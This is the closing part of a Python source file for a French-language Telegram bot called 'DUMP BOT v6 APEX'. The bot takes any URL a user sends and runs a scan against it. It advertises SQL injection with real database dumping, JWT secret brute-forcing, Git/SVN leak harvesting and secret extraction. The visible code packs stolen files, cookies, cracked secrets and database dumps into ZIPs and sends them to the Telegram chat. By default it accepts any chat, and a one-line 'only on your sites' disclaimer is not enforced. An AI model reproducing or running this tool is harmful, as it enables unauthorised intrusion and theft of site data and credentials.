            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 CVE: <code>{len(self.summary.get('cves', []))}</code> "
            f"🔑 JWT cassés: <code>{jwt_cracked}</code>\n"
            f"🕸️ Web shells: <code>{len(self.summary.get('webshells', []))}</code>\n"
            "━━━━━━━━━━━━━━━━━━━━━\n"
            f"📦 ZIPs: <code>{len(all_zips)}</code>"
            + (f"\n📄 PDF: ✅" if pdf_ok else "")
        )
        self.notify(msg)

        # Alertes critiques
        if db_dump and db_tables:
            alert = f"💥 <b>DB DUMP RÉUSSI !</b>\n"
            alert += f"📋 <code>{db_tables}</code> table(s), <code>{db_rows}</code> ligne(s)\n"
            for r in db_dump[:1]:
                alert += f"\n🎯 <code>{r['param']}</code> @ <code>{r['url'][:60]}</code>"
                if r.get("tables"):
                    alert += f"\n📋 <code>{', '.join(r['tables'][:10])}</code>"
            self.notify(alert)

        if self.summary.get("webshells"):
            alert = f"💀 <b>WEB SHELLS : {len(self.summary['webshells'])}</b>\n"
            for w in self.summary["webshells"][:5]:
                alert += f"\n💀 <code>{w['file']}</code> → {w['shell']}"
            self.notify(alert)

        if self.summary.get("cves"):
            critical = [c for c in self.summary["cves"]
                       if c.get("score") and c["score"] >= 7.0]
            if critical:
                alert = f"🎯 <b>{len(critical)} CVE CRITIQUE(S)</b>\n"
                for c in critical[:5]:
                    alert += f"\n🚨 <b>{c['id']}</b> ({c.get('score','?')}) — {c['product']} {c['version']}"
                self.notify(alert)

        if jwt_cracked:
            alert = f"🔑 <b>{jwt_cracked} JWT CASSÉ(S) !</b>\n"
            for j in self.summary["jwts"]:
                if j.get("cracked"):
                    alert += f"\n💥 Secret: <code>{j['cracked']['secret']}</code>"
                    break
            self.notify(alert)

        if self.summary.get("secrets"):
            alert = f"🔐 <b>SECRETS : {len(self.summary['secrets'])}</b>\n"
            for sec in self.summary["secrets"][:6]:
                alert += f"\n🚨 <b>{sec['type']}</b>\n<code>{sec['value'][:60]}</code>"
            self.notify(alert)

        for i, z in enumerate(all_zips, 1):
            log(f"📤 {z['name']} ({z['size_mb']:.2f} Mo)")
            caption = f"📦 <b>Partie {i}/{len(all_zips)}</b>\n📄 {z['files_count']} fichiers\n💾 {z['size_mb']:.2f} Mo"
            self.bot.send_document(self.chat_id, z["path"], caption)

        self.notify("🎉 <b>Tous les fichiers envoyés !</b>")

        try:
            import shutil
            shutil.rmtree(self.output_dir, ignore_errors=True)
            for z in all_zips:
                try:
                    os.remove(z["path"])
                except Exception:
                    pass
        except Exception:
            pass

    def _create_zips(self):
        max_bytes = MAX_ZIP_MB * 1024 * 1024
        all_zips = []
        for folder_name in ["js", "js_iframe", "css", "iframes", "php", "sensitive",
                            "img", "other", "sourcemaps", "crawled", "db_backups"]:
            folder = os.path.join(self.output_dir, folder_name)
            if not os.path.isdir(folder):
                continue
            files = []
            for root, _, filenames in os.walk(folder):
                for f in filenames:
                    full = os.path.join(root, f)
                    try:
                        files.append((full, os.path.getsize(full)))
                    except Exception:
                        pass
            if not files:
                continue
            files.sort(key=lambda x: -x[1])
            bins = []
            for full, size in files:
                placed = False
                for b in bins:
                    if b["size"] + size <= max_bytes:
                        b["files"].append(full)
                        b["size"] += size
                        placed = True
                        break
                if not placed:
                    bins.append({"files": [full], "size": size})
            for i, b in enumerate(bins, 1):
                zip_name = f"dump_{folder_name}_part{i:02d}.zip"
                zip_path = os.path.join("/tmp", zip_name)
                with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED, compresslevel=9) as z:
                    for full in b["files"]:
                        z.write(full, os.path.relpath(full, self.output_dir))
                all_zips.append({"path": zip_path, "name": zip_name,
                    "size_mb": os.path.getsize(zip_path)/1024/1024,
                    "files_count": len(b["files"])})
        root_zip = os.path.join("/tmp", "dump_root.zip")
        with zipfile.ZipFile(root_zip, "w", zipfile.ZIP_DEFLATED) as z:
            for f in ["index.html", "cookies.json", "SUMMARY.json", "REPORT.html",
                      "REPORT.pdf", "robots.txt", "sitemap.xml", "db_dump.json"]:
                full = os.path.join(self.output_dir, f)
                if os.path.exists(full):
                    z.write(full, f)
        all_zips.append({"path": root_zip, "name": "dump_root.zip",
            "size_mb": os.path.getsize(root_zip)/1024/1024, "files_count": 8})
        return all_zips


# =================================================================
# BOT PRINCIPAL
# =================================================================
class DumpBot:
    def __init__(self):
        self.bot = Bot(TELEGRAM_TOKEN)
        self.active_dumps = {}
        self.db = HistoryDB()

    def is_allowed(self, chat_id):
        if not ALLOWED_CHAT_IDS:
            return True
        return str(chat_id) in [str(x) for x in ALLOWED_CHAT_IDS]

    def send_welcome(self, chat_id):
        self.bot.send_message(chat_id, """
👋 <b>DUMP BOT — POWER EDITION v6 APEX</b>
━━━━━━━━━━━━━━━━━━━━━
<b>Commandes :</b>
• <code>/start</code> — ce message
• <code>/id</code> — ton chat_id
• <code>/stats</code> — stats globales
• <code>/history</code> — derniers dumps
• <code>/help</code> — aide

<b>Usage :</b> envoie une URL

🔥 <b>Modules v6 :</b>
• 🕷️ Crawler multi-niveaux
• 🧬 Fingerprint WAF/CDN
• 🔓 Déobfuscation JS
• 🕵️ Énumération sous-domaines (crt.sh)
• 🌐 Découverte API (Swagger/GraphQL)
• 💀 Fuites Git/SVN
• 🔐 Décodage + brute-force JWT
• 🎓 SQLi (error/boolean/time-based)
• 🎭 Détection XSS
• 📂 Détection LFI
• 🌐 Détection SSRF
• 💥 <b>DB DUMP RÉEL</b> (tables + colonnes + données)
• 🎯 CVE lookup (NVD)
• 🕸️ Détection web shells
• 📄 Export PDF
• 📊 Score de risque A-F
• 💾 Historique SQLite

⚠️ <i>Uniquement sur TES sites.</i>
""")

    def cmd_stats(self, chat_id):
        row = self.db.stats()
        total, files, size_mb, secrets, sqli, xss, lfi, db_tables = row
        active = sum(1 for t in self.active_dumps.values() if t.is_alive())
        self.bot.send_message(chat_id,
            f"📊 <b>Stats</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔢 Dumps : <code>{total or 0}</code>\n"
            f"📁 Fichiers : <code>{files or 0}</code>\n"
            f"💾 Taille : <code>{(size_mb or 0):.1f} Mo</code>\n"
            f"🔐 Secrets : <code>{secrets or 0}</code>\n"
            f"💉 SQLi : <code>{sqli or 0}</code>\n"
            f"🎭 XSS : <code>{xss or 0}</code>\n"
            f"📂 LFI : <code>{lfi or 0}</code>\n"
            f"🔥 Tables DB dumpées : <code>{db_tables or 0}</code>\n"
            f"⚡ Actifs : <code>{active}</code>")

    def cmd_history(self, chat_id):
        rows = self.db.recent(10)
        if not rows:
            self.bot.send_message(chat_id, "📭 Aucun historique.")
            return
        msg = "📜 <b>10 derniers dumps</b>\n━━━━━━━━━━━━━━━━━━━━━\n"
        for r in rows:
            msg += f"\n• <code>{(r[2] or '')[:16]}</code> [{r[14] or '?'}]\n"
            msg += f"  🌐 <code>{(r[1] or '')[:60]}</code>\n"
            msg += f"  📦 {r[5] or 0} fichiers | 💉{r[8] or 0} 🎭{r[9] or 0}\n"
        self.bot.send_message(chat_id, msg)

    def handle_update(self, update):
        try:
            msg = update.get("message")
            if not msg:
                return
            chat_id = msg["chat"]["id"]
            text = msg.get("text", "").strip()
            log(f"📨 {chat_id} : {text[:80]}")
            if not self.is_allowed(chat_id):
                self.bot.send_message(chat_id, f"⛔ Chat ID : <code>{chat_id}</code>")
                return
            if text in ("/start", "/help"):
                self.send_welcome(chat_id)
                return
            if text == "/id":
                self.bot.send_message(chat_id, f"🆔 <code>{chat_id}</code>")
                return
            if text == "/stats":
                self.cmd_stats(chat_id)
                return
            if text == "/history":
                self.cmd_history(chat_id)
                return
            if chat_id in self.active_dumps and self.active_dumps[chat_id].is_alive():
                self.bot.send_message(chat_id, "⏳ Dump en cours...")
                return
            m = RE_URL.search(text)
            if m:
                url = m.group(0).rstrip('.,;!?)')
                log(f"🚀 Dump v6 : {url}")
                d = Dumper(url, chat_id, self.bot)
                t = threading.Thread(target=d.run, daemon=True)
                self.active_dumps[chat_id] = t
                t.start()
            else:
                self.bot.send_message(chat_id, "❓ Envoie une URL.")
        except Exception as e:
            log(f"Handle error: {e}", "ERROR")
            traceback.print_exc()

    def run(self):
        log("=" * 60)
        log("🤖 DUMP BOT v6 APEX")
        log("=" * 60)
        me = self.bot.me()
        if not me:
            log("❌ Token invalide", "ERROR")
            sys.exit(1)
        log(f"✅ Bot : @{me['username']}")
        log(f"👥 Allowed : {ALLOWED_CHAT_IDS or 'TOUS'}")
        log(f"⚙️ DB_DUMP={DB_DUMP_ENABLED} CVE={CVE_LOOKUP_ENABLED} "
            f"JWT={JWT_BRUTE_ENABLED} SSRF={SSRF_SCAN_ENABLED} PDF={PDF_EXPORT_ENABLED}")
        log("📡 Polling...")
        while True:
            try:
                for u in self.bot.get_updates(timeout=25):
                    self.handle_update(u)
            except KeyboardInterrupt:
                break
            except Exception as e:
                log(f"Loop error: {e}", "ERROR")
                time.sleep(5)


# =================================================================
# MAIN
# =================================================================
if __name__ == "__main__":
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN manquant", flush=True)
        print("Usage : export TELEGRAM_TOKEN='ton_token'", flush=True)
        sys.exit(1)
    DumpBot().run()
